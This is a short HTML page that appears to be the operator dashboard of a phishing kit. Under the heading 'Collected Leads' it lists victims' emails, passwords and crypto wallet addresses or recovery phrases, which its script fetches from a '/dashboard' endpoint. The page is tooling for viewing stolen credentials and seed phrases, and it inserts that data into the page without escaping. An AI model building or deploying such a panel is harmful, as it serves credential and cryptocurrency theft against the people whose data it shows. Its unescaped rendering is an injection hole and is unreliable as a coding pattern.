<!DOCTYPE html>
<html>
<head>
    <title>Leads</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f9; padding: 20px; }
        table { width: 100%; border-collapse: collapse; background: white; }
        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
        th { background: #0052ff; color: white; }
    </style>
</head>
<body>
    <h1>Collected Leads</h1>
    <table>
        <thead>
            <tr><th>Email</th><th>Pass</th><th>Wallet/Phrase</th><th>Date</th></tr>
        </thead>
        <tbody id="leads"></tbody>
    </table>
    <script>
        async function load() {
            const res = await fetch('/dashboard');
            const data = await res.json();
            const body = document.getElementById('leads');
            data.forEach(l => {
                body.innerHTML += `<tr>
                    <td>${l.email}</td><td>${l.password}</td>
                    <td>${l.walletAddress || l.recoveryPhrase}</td>
                    <td>${new Date(l.timestamp).toLocaleString()}</td>
                </tr>`;
            });
        }
        load();
    </script>
</body>
</html>
